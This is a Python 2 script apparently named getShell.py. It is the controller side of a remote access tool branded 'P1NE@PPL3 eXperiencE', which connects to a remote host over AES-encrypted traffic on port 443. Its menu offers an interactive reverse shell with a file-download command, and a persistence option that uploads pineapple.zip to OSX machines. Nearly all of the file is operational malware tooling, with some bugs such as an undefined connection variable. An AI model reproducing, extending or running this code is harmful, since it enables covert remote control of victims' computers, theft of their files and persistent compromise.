#!/usr/bin/python

import sys, socket, time
import hashlib
from Crypto.Cipher import AES
import base64, os

# the block size for the cipher object; must be 32 for AES
BLOCK_SIZE = 32

RESPONSE_TIME = 3

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

p1 = "X4b7AF412dfg5a29"
control = "2c7575b7603e8e55807734a2ed1b5fbb"


# Define the EOF marker
EOF = 'ab\EOF'

#Function for md5 hash of a File (parameter is file name)
def md5(fname):
    hash = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash.update(chunk)
    return hash.hexdigest()

def sendFile(conn, fileName, cipher):
   with open(fileName, 'rb') as f:
      checksum = md5(fileName)
      print checksum
      print 'sending file'
      
      fileNam = os.path.basename(fileName)
      conn.send(EncodeAES(cipher, fileName))
      time.sleep(0.2)

      fileData = f.read(512)
    # Read 1024 bytes and make sure not end of file
      while fileData != '':
         encData = EncodeAES(cipher, fileData)
         conn.send(encData)
         fileData = f.read(512)
         time.sleep(0.2)
    # Send EOF marker
      conn.send(EOF) 
      time.sleep(0.2)
      conn.send(EncodeAES(cipher, checksum))
      f.close()

def recvFile(conn, filePath, cipher):
   fileName = conn.recv(1024)
   fileName = DecodeAES(cipher, fileName)
   filePath += fileName
   time.sleep(0.2)

   with open (filePath, 'wb') as f:   

      fileData = conn.recv(1024)
      while (EOF != fileData):
         fileData = DecodeAES(cipher, fileData)
         f.write(fileData)
         time.sleep(0.2)
         fileData = conn.recv(1024)

      time.sleep(0.2)
      checksum = DecodeAES(cipher, conn.recv(1024))
      f.close()
      if (md5(filePath) != checksum):
         print 'Error in file transfer: md5 hash mismatch'
         sys.exit(1)


if len(sys.argv) <= 1:
   print 'Usage: getShell.py <remote-ip-address> <port[optional]>'
   sys.exit()
HOST = sys.argv[1]

if len(sys.argv) == 3:
   PORT = int(sys.argv[2])
else:
   PORT = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))

s.send(p1)
data = s.recv(1024)
secret = data + p1
h = hashlib.md5(secret).hexdigest()

if (h != control):
   sys.exit()

cipher = AES.new(secret)
#Handshake Done
time.sleep(1)

message = "Welcome to the P1NE@PPL3 eXperiencE!\n"
message += "1) Reverse Shell\n"
message += "2) Run presistence script\n"
message += "Enter your choice: "

activity = input(message)

s.send(EncodeAES(cipher, bytes(activity)))

if activity == 1:
   data = s.recv(1024)
   print DecodeAES(cipher, data)

   adieu = EncodeAES(cipher, 'Adieu')

   while 1:
      input = raw_input('Enter command: ')
      s.send(EncodeAES(cipher, input))
    # Start a timer to know how long to wait before recieving
      start = time.clock()
    # Download a file
      if (input.startswith('px-download')):
         #baseFileName = os.path.basename(input[12:])
         recvFile(conn, '', cipher) # Recieve a file and save as baseFileName
    # Run a command
      else:
       # Wait until RESPONSE_TIME seconds have passed and then respond.
         elapsedSecs = (time.clock()-start)/0.125
         time.sleep(RESPONSE_TIME - elapsedSecs)            
         data = s.recv(1024)
         print DecodeAES(cipher, data)
         if (input == 'quit'): break
elif activity == 2:
   print DecodeAES(cipher, s.recv(1024))
   platform = DecodeAES(cipher, s.recv(512))
   if (platform == 'OSX'):
      sendFile(s, 'pineapple.zip', cipher)
      print DecodeAES(cipher, s.recv(1024))
      if (s.recv(1024) != 'Adieu'):
         print 'Error in server quit'

s.close()
print "Goodbye!"   

